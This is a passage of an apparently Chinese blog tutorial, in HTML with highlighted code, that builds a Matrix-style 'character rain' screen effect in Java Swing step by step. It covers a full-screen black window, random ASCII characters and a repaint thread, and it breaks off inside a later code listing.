class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyListener;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.MemoryImageSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rain</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 屏幕大小</span></span><br><span class="line">    <span class="keyword">private</span> Dimension screen;</span><br><span class="line">    <span class="comment">// 画布容器</span></span><br><span class="line">    <span class="keyword">private</span> JPanel graphicsPanel;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Rain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取屏幕大小</span></span><br><span class="line">        screen = getToolkit().getScreenSize();</span><br><span class="line">        <span class="comment">// 设置去掉标题栏</span></span><br><span class="line">        setUndecorated(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 设置光标不可见</span></span><br><span class="line">        Toolkit defaultToolkit = Toolkit.getDefaultToolkit();</span><br><span class="line">        Image image = defaultToolkit.createImage(<span class="keyword">new</span> MemoryImageSource(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">null</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">        Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>), <span class="string">"cursor"</span>);</span><br><span class="line">        setCursor(invisibleCursor);</span><br><span class="line">        <span class="comment">// 设置全屏</span></span><br><span class="line">        setSize(screen);</span><br><span class="line">        <span class="comment">// 设置按esc键退出</span></span><br><span class="line">        addKeyListener(<span class="keyword">new</span> KeyListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyTyped</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyPressed</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123;</span><br><span class="line">                    System.exit(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyReleased</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        graphicsPanel = <span class="keyword">new</span> GraphicsPanel();</span><br><span class="line">        <span class="comment">// 设置面板</span></span><br><span class="line">        setContentPane(graphicsPanel);</span><br><span class="line">        <span class="comment">// 设置界面可显示</span></span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">GraphicsPanel</span> <span class="keyword">extends</span> <span class="title">JPanel</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 设置背景黑色填充</span></span><br><span class="line">            g.setColor(Color.BLACK);</span><br><span class="line">            g.fillRect(<span class="number">0</span>, <span class="number">0</span>, screen.width, screen.height);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Rain();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 现在运行这个程序，不必奇怪，也不必害怕，我们会得到一个纯黑色的界面，我们可以通过按esc键退出程序，或者调出任务管理器杀掉该进程</p></li><li><p>准备工作做好了，现在我们来分析一下字符雨所具有的一些元素，很明显，我们需要在这个页面上画出一些随机字符，于是我们需要设置字符的大小，需要获取随机的字符，并且需要在页面上画出来，所以我们需要划分一下界面的行和列，基于以上分析，我们先画一个充满了随机字符的页面，于是我们将代码改进成这样：</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyListener;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.MemoryImageSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rain</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 屏幕大小</span></span><br><span class="line">    <span class="keyword">private</span> Dimension screen;</span><br><span class="line">    <span class="comment">// 画布容器</span></span><br><span class="line">    <span class="keyword">private</span> JPanel graphicsPanel;</span><br><span class="line">    <span class="comment">// 字符大小</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size = <span class="number">16</span>;</span><br><span class="line">    <span class="comment">// 划分屏幕区域，行数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> rows;</span><br><span class="line">    <span class="comment">// 划分屏幕区域，列数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> cols;</span><br><span class="line">    <span class="comment">// 随机</span></span><br><span class="line">    <span class="keyword">private</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Rain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取屏幕大小</span></span><br><span class="line">        screen = getToolkit().getScreenSize();</span><br><span class="line">        <span class="comment">// 设置去掉标题栏</span></span><br><span class="line">        setUndecorated(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 设置光标不可见</span></span><br><span class="line">        Toolkit defaultToolkit = Toolkit.getDefaultToolkit();</span><br><span class="line">        Image image = defaultToolkit.createImage(<span class="keyword">new</span> MemoryImageSource(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">null</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">        Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>), <span class="string">"cursor"</span>);</span><br><span class="line">        setCursor(invisibleCursor);</span><br><span class="line">        <span class="comment">// 设置全屏</span></span><br><span class="line">        setSize(screen);</span><br><span class="line">        <span class="comment">// 设置按esc键退出</span></span><br><span class="line">        addKeyListener(<span class="keyword">new</span> KeyListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyTyped</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyPressed</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123;</span><br><span class="line">                    System.exit(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyReleased</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        graphicsPanel = <span class="keyword">new</span> GraphicsPanel();</span><br><span class="line">        <span class="comment">// 设置面板</span></span><br><span class="line">        setContentPane(graphicsPanel);</span><br><span class="line">        <span class="comment">// 设置界面可显示</span></span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置行数和列数</span></span><br><span class="line">        rows = screen.width / size;</span><br><span class="line">        cols = screen.height / size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取随机ASCII可见字符</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">char</span> <span class="title">getRandomChar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">char</span>) (<span class="keyword">new</span> Random().nextInt(<span class="number">94</span>) + <span class="number">33</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 画布容器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">GraphicsPanel</span> <span class="keyword">extends</span> <span class="title">JPanel</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 设置背景黑色填充</span></span><br><span class="line">            g.setColor(Color.BLACK);</span><br><span class="line">            g.fillRect(<span class="number">0</span>, <span class="number">0</span>, screen.width, screen.height);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历划分的区域，将所有位置填满随机字符</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; rows; x++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> y = <span class="number">0</span>; y &lt; cols; y++) &#123;</span><br><span class="line">                    <span class="comment">// 设置随机字符的颜色和字体</span></span><br><span class="line">                    g.setColor(Color.CYAN);</span><br><span class="line">                    g.setFont(<span class="keyword">new</span> Font(<span class="string">"黑体"</span>, Font.BOLD, size));</span><br><span class="line">                    <span class="comment">// 画</span></span><br><span class="line">                    g.drawString(String.valueOf(getRandomChar()), x * size, y * size);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Rain();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 现在运行代码，你将会得到类似下面这样的界面，页面是静态的<br> <img src="/posts/a49748b4/2020-08-10-18-45-48.png" alt="充满随机字符的页面"></p></li><li><p>现在我们来尝试让界面动起来，怎么做呢，很简单，我们可以开一个线程，专门去刷新页面，具体就是定时调用JPanel的repaint方法，于是代码进一步更改成这样了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.KeyListener;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.MemoryImageSource;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Rain</span> <span class="keyword">extends</span> <span class="title">JFrame</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 屏幕大小</span></span><br><span class="line">    <span class="keyword">private</span> Dimension screen;</span><br><span class="line">    <span class="comment">// 画布容器</span></span><br><span class="line">    <span class="keyword">private</span> JPanel graphicsPanel;</span><br><span class="line">    <span class="comment">// 字符大小</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> size = <span class="number">16</span>;</span><br><span class="line">    <span class="comment">// 划分屏幕区域，行数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> rows;</span><br><span class="line">    <span class="comment">// 划分屏幕区域，列数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> cols;</span><br><span class="line">    <span class="comment">// 随机</span></span><br><span class="line">    <span class="keyword">private</span> Random random = <span class="keyword">new</span> Random();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Rain</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 获取屏幕大小</span></span><br><span class="line">        screen = getToolkit().getScreenSize();</span><br><span class="line">        <span class="comment">// 设置去掉标题栏</span></span><br><span class="line">        setUndecorated(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 设置光标不可见</span></span><br><span class="line">        Toolkit defaultToolkit = Toolkit.getDefaultToolkit();</span><br><span class="line">        Image image = defaultToolkit.createImage(<span class="keyword">new</span> MemoryImageSource(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">null</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">        Cursor invisibleCursor = defaultToolkit.createCustomCursor(image, <span class="keyword">new</span> Point(<span class="number">0</span>, <span class="number">0</span>), <span class="string">"cursor"</span>);</span><br><span class="line">        setCursor(invisibleCursor);</span><br><span class="line">        <span class="comment">// 设置全屏</span></span><br><span class="line">        setSize(screen);</span><br><span class="line">        <span class="comment">// 设置按esc键退出</span></span><br><span class="line">        addKeyListener(<span class="keyword">new</span> KeyListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyTyped</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyPressed</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (e.getKeyCode() == KeyEvent.VK_ESCAPE) &#123;</span><br><span class="line">                    System.exit(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">keyReleased</span><span class="params">(KeyEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        graphicsPanel = <span class="keyword">new</span> GraphicsPanel();</span><br><span class="line">        <span class="comment">// 设置面板</span></span><br><span class="line">        setContentPane(graphicsPanel);</span><br><span class="line">        <span class="comment">// 设置界面可显示</span></span><br><span class="line">        setVisible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置行数和列数</span></span><br><span class="line">        rows = screen.width / size;</span><br><span class="line">        cols = screen.height / size;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开启定时刷新</span></span><br><span class="line">        <span class="keyword">new</span> Refresher(<span class="number">100</span>, graphicsPanel).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 获取随机ASCII可见字符</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">char</span> <span class="title">getRandomChar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">char</span>) (<span class="keyword">new</span> Random().nextInt(<span class="number">94</span>) + <span class="number">33</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 画布容器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">GraphicsPanel</span> <span class="keyword">extends</span> <span class="title">JPanel</span> </span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">paint</span><span class="params">(Graphics g)</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 设置背景黑色填充</span></span><br><span class="line">            g.setColor(Color.BLACK);</span><br><span class="line">            g.fillRect(<span class="number">0</span>, <span class="number">0</span>, screen.width, screen.height);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 遍历划分的区域，将所有位置填满随机字符</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">0</span>; x &lt; rows; x++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> y = <span class="number">0</span>; y &lt; cols; y++) &#123;</span><br><span class="line">                    <span class="comment">// 设置随机字符的颜色和字体</span></span><br><span class="line">                    g.setColor(Color.CYAN);</span><br><span class="line">                    g.setFont(<span class="keyword">new</span> Font(<span class="string">"黑体"</span>, Font.BOLD, size));</span><br><span class="line">                    <span class="comment">// 画</span></span><br><span class="line">                    g.drawString(String.valueOf(getRandomChar()), x * size, y * size);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 定时刷新画布容器</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Refresher</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> sleep;</span><br><span class="line">        <span class="keyword">private</span> JPanel panel;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Refresher</span><span class="params">(<span class="keyword">int</span> sleep, JPanel panel)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.sleep = sleep;</span><br><span class="line">            <span class="keyword">this</span>.panel = panel;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="comment">// 死循环固定休眠，即可达到定时刷新的效果</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    panel.repaint();</span><br><span class="line">                    Thread.sleep(sleep);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Rain();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在运行程序，可以明显看到页面动起来了<br><img src="/posts/a49748b4/2020-08-10-18-45-59.gif" alt></p></li><li><p>现在再来仔细分析一下，黑客帝国的代码雨，可以看到，雨滴是一列一列从屏幕最上面，慢慢的下落到最下面；雨滴的头是和雨滴的身体的颜色不一样；雨滴的长度不会很长；重复这个过程；基于这个过程，我们不难想到将代码改写如下</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span 